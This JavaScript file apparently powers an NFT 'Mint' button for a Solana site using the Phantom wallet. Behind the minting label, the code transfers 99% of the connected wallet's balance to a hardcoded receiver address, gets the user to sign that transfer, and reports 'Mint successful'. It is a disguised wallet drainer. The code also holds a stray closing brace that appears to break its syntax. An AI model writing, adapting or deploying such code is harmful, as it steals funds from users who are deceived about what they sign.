$(document).ready(function () {
    $('#connect-wallet').on('click', async () => {
        if (window.solana && window.solana.isPhantom) {
            try {
                const resp = await window.solana.connect();
                console.log("Phantom Wallet connected:", resp);

                const connection = new solanaWeb3.Connection(
                    'https://api.testnet.solana.com',
                    'confirmed'
                );

                const publicKey = resp.publicKey;
                const walletBalance = await connection.getBalance(publicKey);
                console.log("Wallet balance:", walletBalance / solanaWeb3.LAMPORTS_PER_SOL, "SOL");

                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                const TX_FEE = 5000;

                if (walletBalance < minBalance + TX_FEE) {
                    alert("Insufficient funds.");
                    return;
                }

                $('#connect-wallet').text("Mint").off('click').on('click', async () => {
                    try {
                        const receiverWallet = new solanaWeb3.PublicKey('FMS1qwLyGY2GATdPQp5c3Hw3zbXtyLJTk3DhxomnQa7Q');
                        const balanceForTransfer = walletBalance - minBalance - TX_FEE;

                        if (walletBalance < TX_FEE) {
    alert("Insufficient funds.");
    return;
}
                        }

                        var transaction = new solanaWeb3.Transaction().add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: publicKey,
                                toPubkey: receiverWallet,
                                lamports: Math.floor(balanceForTransfer * 0.99),
                            })
                        );

                        transaction.feePayer = publicKey;

                        // getRecentBlockhash is deprecated — use getLatestBlockhash
                        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
                        transaction.recentBlockhash = blockhash;

                        const signed = await window.solana.signTransaction(transaction);
                        console.log("Transaction signed:", signed);

                        const txid = await connection.sendRawTransaction(signed.serialize());
                        console.log("Transaction sent:", txid);

                        // confirmTransaction with blockhash strategy (not deprecated)
                        await connection.confirmTransaction({
                            signature: txid,
                            blockhash,
                            lastValidBlockHeight,
                        });

                        console.log("Transaction confirmed:", txid);
                        alert("Mint successful! TX: " + txid);

                        // Reset button after successful mint
                        $('#connect-wallet').text("Connected").off('click');

                    } catch (err) {
                        console.error("Error during minting:", err);
                        alert("Mint failed: " + err.message);
                    }
                });

            } catch (err) {
                console.error("Error connecting to Phantom Wallet:", err);
                alert("Wallet connection failed: " + err.message);
            }

        } else {
            alert("Phantom extension not found.");
            const isFirefox = typeof InstallTrigger !== "undefined";
            const isChrome = !!window.chrome;

            if (isFirefox) {
                window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
            } else if (isChrome) {
                window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
            } else {
                alert("Please download the Phantom extension for your browser.");
            }
        }
    });
});
    
